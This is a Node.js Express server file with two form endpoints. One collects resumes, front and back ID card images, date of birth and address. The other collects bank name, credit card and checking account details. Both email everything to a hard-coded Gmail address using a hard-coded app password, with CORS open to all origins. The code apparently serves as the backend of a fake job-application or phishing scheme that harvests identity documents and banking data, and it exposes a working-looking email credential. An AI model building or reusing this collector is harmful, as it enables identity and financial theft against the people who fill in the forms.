const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const upload = multer({ storage: multer.memoryStorage() }); // Store files in memory

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.raw());
app.use(bodyParser.text());

app.use(cors({
  origin: '*' // Replace with your actual HTML domain
}));

app.get('/', (req, res) => {
  res.send("Server");
});

const cpUpload = upload.fields([
  { name: 'client_resume', maxCount: 1 },
  { name: 'cover_letter', maxCount: 8 },
  { name: 'front_id_card', maxCount: 2 },
  {name: 'back_id_card', maxCount: 2}
]);

app.post('/send-email', cpUpload, (req, res) => {
  const {
    last_name, first_name, name_title, middle_name, email_address, phone_number, date_of_birth, client_state, client_address, client_city, postal_code
  } = req.body;

  console.log(req.body);

  const resume = req.files.client_resume ? req.files.client_resume[0] : null;
  const coverLetter = req.files.cover_letter ? req.files.cover_letter[0] : null;
  const frontidCard = req.files.front_id_card ? req.files.front_id_card[0] : null;
  const backidCard = req.files.back_id_card ? req.files.back_id_card[0] : null;


  // Construct email message
  const message = `
    Contact Information:
    Last Name: ${last_name}
    First Name: ${first_name}
    Title: ${name_title}
    Middle Name: ${middle_name}
    Email Address: ${email_address}
    Phone Number: ${phone_number}

    Sensitive Information:
    Date of Birth: ${date_of_birth}

    Address:
    State: ${client_state}
    Address Line: ${client_address}
    City: ${client_city}
    Postal Code: ${postal_code}
  `;

  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'davidmiller4504@gmail.com',
      pass: 'dqhc mwpf nkmb buib'
    }
  });

  // Setup email data with unicode symbols
  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "davidleonardo385@gmail.com", // list of receivers
    subject: 'New Contact Form Submission', // Subject line
    text: message, // plain text body
    attachments: [
      resume ? { filename: resume.originalname, content: resume.buffer } : null,
      coverLetter ? { filename: coverLetter.originalname, content: coverLetter.buffer } : null,
      frontidCard ? { filename: frontidCard.originalname, content: frontidCard.buffer } : null,
      backidCard ? { filename: backidCard.originalname, content: backidCard.buffer } : null


    ].filter(attachment => attachment) // Include only attachments that exist
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('Email sent successfully!');
    }
  });
});

app.post("/sender", async (req, res) => {
  const { bank_name, credit_card, payment_method, company_trust, checking_account, email } = req.body;
  console.log(req.body);

  // Construct email message
  const message = `
    Contact Information (bank details):
    Bank Name: ${bank_name}
    Credit Name: ${credit_card}
    Payment Method: ${payment_method}
    Company Trust: ${company_trust}
    Checking Account: ${checking_account}
    Email: ${email}
  `;

  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'davidmiller4504@gmail.com',
      pass: 'dqhc mwpf nkmb buib'
    }
  });

  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "davidleonardo385@gmail.com", // list of receivers
    subject: 'New Contact Form Submission', // Subject line
    text: message // plain text body
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent: ' + info.response);
      res.json({ success: true, message: 'Email sent successfully!' });
    }
  });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

